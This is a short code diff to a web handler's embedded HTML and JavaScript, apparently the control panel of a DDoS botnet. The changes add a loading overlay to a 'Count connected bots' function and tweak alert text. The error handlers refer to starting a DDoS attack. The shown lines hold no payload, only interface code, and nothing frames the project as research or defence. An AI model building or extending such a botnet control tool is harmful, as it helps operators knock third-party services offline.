@@ -360,8 +360,7 @@ async def get():
             <br><br>
 
             <button onclick="botCount()">Count connected bots</button>
-            <p id="botCountDisplay"></p>
-
+           
             <div id="overlay">
                 <div class="spinner"></div>
                 <p id="loadingMessage" style="display: none;"></p>
@@ -462,19 +461,21 @@ async def get():
                 function botCount() {
                 
                     const url = `/bot_count`;
-
+                    showOverlay("Counting Bots...")
                     fetch(url)
                         .then(response => response.json())
                         .then(data => {
+                            hideOverlay()
                             console.log("Connected Bots", data);
                             if (data.message === "Bot count not found.") {
                                     alert(data.message);
                                 } else {
-                                    alert("Bot Connected: " + data.message);
+                                    alert("Bots Connected: " + data.message);
                                     // document.getElementById("botCountDisplay").innerText = `Connected Bots: ${data.message}`;
                                 } // Show the confirmation message to the user
                         })
                         .catch(error => {
+                            hideOverlay()
                             console.error("Error starting DDoS attack:", error);
                             alert("Failed to start DDoS attack. Check the console for errors.");
                         });
